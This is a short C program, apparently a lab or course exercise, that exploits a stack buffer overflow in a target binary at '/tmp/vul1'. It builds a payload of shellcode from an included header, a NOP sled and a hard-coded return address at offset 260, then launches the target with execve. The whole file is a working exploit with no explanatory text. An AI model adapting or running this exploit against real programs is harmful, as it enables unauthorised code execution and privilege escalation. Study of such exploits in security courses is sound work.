#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul1"

int main(void)
{
    unsigned int return_addr = 0xffffdc4c;
    char payload[264];
    memcpy(payload, shellcode, strlen(shellcode));
    for (int i = strlen(shellcode); i < 260; i++)
        payload[i] = 0x90;
    memcpy(&payload[260], &return_addr, 4);

    char *args[] = {TARGET, payload, NULL};
    // char *args[] = {TARGET, "123", NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
